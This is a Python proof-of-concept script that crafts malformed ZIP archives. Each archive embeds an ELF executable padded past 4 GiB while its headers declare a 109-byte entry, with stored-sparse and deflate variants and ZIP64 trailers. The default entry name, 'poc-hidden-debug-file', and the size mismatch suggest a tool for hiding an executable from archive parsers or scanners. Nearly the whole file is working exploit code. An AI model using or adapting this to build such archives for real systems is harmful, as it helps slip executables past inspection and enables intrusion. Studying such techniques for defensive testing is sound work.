import argparse
import os
import pathlib
import struct
import subprocess
import zlib


def pack_local(name, crc, compressed_size, declared_size):
    return struct.pack(
        "<IHHHHHIIIHH",
        0x04034B50,
        20,
        0,
        8,
        0,
        0,
        crc,
        compressed_size,
        declared_size,
        len(name),
        0,
    ) + name


def pack_central(name, crc, compressed_size, declared_size):
    return struct.pack(
        "<IHHHHHHIIIHHHHHII",
        0x02014B50,
        20,
        20,
        0,
        8,
        0,
        0,
        crc,
        compressed_size,
        declared_size,
        len(name),
        0,
        0,
        0,
        0,
        0,
        0,
    ) + name


def pack_eocd(central_size, central_offset):
    return struct.pack(
        "<IHHHHIIH",
        0x06054B50,
        0,
        0,
        1,
        1,
        central_size,
        central_offset,
        0,
    )


def pack_zip64_eocd(central_size, central_offset, zip64_eocd_offset):
    return (
        struct.pack(
            "<IQHHIIQQQQ",
            0x06064B50,
            44,
            45,
            45,
            0,
            0,
            1,
            1,
            central_size,
            central_offset,
        )
        + struct.pack("<IIQI", 0x07064B50, 0, zip64_eocd_offset, 1)
        + struct.pack(
            "<IHHHHIIH",
            0x06054B50,
            0,
            0,
            0xFFFF,
            0xFFFF,
            0xFFFFFFFF,
            0xFFFFFFFF,
            0,
        )
    )


def crc32_zero_padded(prefix, actual_size):
    crc = zlib.crc32(prefix) & 0xFFFFFFFF
    remaining = actual_size - len(prefix)
    chunk = b"\x00" * 16777216
    while remaining:
        n = min(remaining, len(chunk))
        crc = zlib.crc32(chunk[:n], crc) & 0xFFFFFFFF
        remaining -= n
    return crc


def make_sparse(path):
    if os.name == "nt":
        subprocess.run(
            ["fsutil", "sparse", "setflag", str(path)],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )


def pack_stored_local(name, crc, actual_size, declared_size):
    extra = struct.pack("<HHQ", 0x0001, 8, actual_size)
    return (
        struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,
            45,
            0,
            0,
            0,
            0,
            crc,
            0xFFFFFFFF,
            declared_size,
            len(name),
            len(extra),
        )
        + name
        + extra
    )


def pack_stored_central(name, crc, actual_size, declared_size):
    extra = struct.pack("<HHQ", 0x0001, 8, actual_size)
    return (
        struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,
            45,
            45,
            0,
            0,
            0,
            0,
            crc,
            0xFFFFFFFF,
            declared_size,
            len(name),
            len(extra),
            0,
            0,
            0,
            0,
            0,
        )
        + name
        + extra
    )


def write_stored_sparse_zip(elf_path, out_path, entry_name, declared_size, actual_size):
    out = pathlib.Path(out_path)
    elf = pathlib.Path(elf_path).read_bytes()
    if len(elf) >= actual_size:
        raise SystemExit("input ELF is larger than the target inflated body")
    name = entry_name.encode("utf-8")
    crc = crc32_zero_padded(elf, actual_size)
    local = pack_stored_local(name, crc, actual_size, declared_size)
    central = pack_stored_central(name, crc, actual_size, declared_size)
    central_offset = len(local) + actual_size
    zip64_eocd_offset = central_offset + len(central)
    trailer = pack_zip64_eocd(len(central), central_offset, zip64_eocd_offset)
    out.parent.mkdir(parents=True, exist_ok=True)
    if out.exists():
        out.unlink()
    with out.open("wb") as f:
        f.write(local)
        f.write(elf)
    make_sparse(out)
    with out.open("r+b") as f:
        f.seek(len(local) + actual_size)
        f.write(central)
        f.write(trailer)
    print(f"archive={out}")
    print(f"entry={entry_name}")
    print("method=stored-sparse")
    print(f"declared_size={declared_size}")
    print(f"actual_inflated_size={actual_size}")
    print(f"actual_low32={actual_size & 0xFFFFFFFF}")
    print(f"stored_size={actual_size}")
    print(f"elf_size={len(elf)}")
    print(f"crc32=0x{crc:08x}")
    print(f"logical_size={out.stat().st_size}")


def write_deflated_body(elf_path, deflated_path, actual_size, level):
    elf = pathlib.Path(elf_path).read_bytes()
    if len(elf) >= actual_size:
        raise SystemExit("input ELF is larger than the target inflated body")
    compressor = zlib.compressobj(level, zlib.DEFLATED, -15)
    crc = zlib.crc32(elf) & 0xFFFFFFFF
    written = 0
    chunk = b"\x00" * 1048576
    remaining = actual_size - len(elf)
    with pathlib.Path(deflated_path).open("wb") as f:
        data = compressor.compress(elf)
        f.write(data)
        written += len(data)
        while remaining:
            n = min(remaining, len(chunk))
            view = chunk[:n]
            crc = zlib.crc32(view, crc) & 0xFFFFFFFF
            data = compressor.compress(view)
            if data:
                f.write(data)
                written += len(data)
            remaining -= n
        data = compressor.flush()
        f.write(data)
        written += len(data)
    return crc, written, len(elf)


def write_deflated_zip(elf_path, out_path, entry_name, declared_size, actual_size, level):
    out = pathlib.Path(out_path)
    temp = out.with_suffix(out.suffix + ".deflated")
    crc, compressed_size, elf_size = write_deflated_body(
        elf_path,
        temp,
        actual_size,
        level,
    )
    if compressed_size > 0xFFFFFFFF:
        raise SystemExit("compressed body is too large for this PoC layout")
    name = entry_name.encode("utf-8")
    local = pack_local(name, crc, compressed_size, declared_size)
    central = pack_central(name, crc, compressed_size, declared_size)
    central_offset = len(local) + compressed_size
    eocd = pack_eocd(len(central), central_offset)
    out.parent.mkdir(parents=True, exist_ok=True)
    with out.open("wb") as f:
        f.write(local)
        with temp.open("rb") as body:
            while True:
                data = body.read(1048576)
                if data == b"":
                    break
                f.write(data)
        f.write(central)
        f.write(eocd)
    temp.unlink()
    print(f"archive={out}")
    print(f"entry={entry_name}")
    print("method=deflate")
    print(f"declared_size={declared_size}")
    print(f"actual_inflated_size={actual_size}")
    print(f"actual_low32={actual_size & 0xFFFFFFFF}")
    print(f"compressed_size={compressed_size}")
    print(f"elf_size={elf_size}")
    print(f"crc32=0x{crc:08x}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--elf", required=True)
    parser.add_argument("--out", required=True)
    parser.add_argument("--entry", default="poc-hidden-debug-file")
    parser.add_argument("--method", choices=("stored-sparse", "deflate"), default="stored-sparse")
    parser.add_argument("--declared-size", type=int, default=109)
    parser.add_argument("--actual-size", type=int, default=(1 << 32) + 109)
    parser.add_argument("--level", type=int, default=9)
    args = parser.parse_args()
    if args.method == "stored-sparse":
        write_stored_sparse_zip(
            args.elf,
            args.out,
            args.entry,
            args.declared_size,
            args.actual_size,
        )
    else:
        write_deflated_zip(
            args.elf,
            args.out,
            args.entry,
            args.declared_size,
            args.actual_size,
            args.level,
        )


if __name__ == "__main__":
    main()
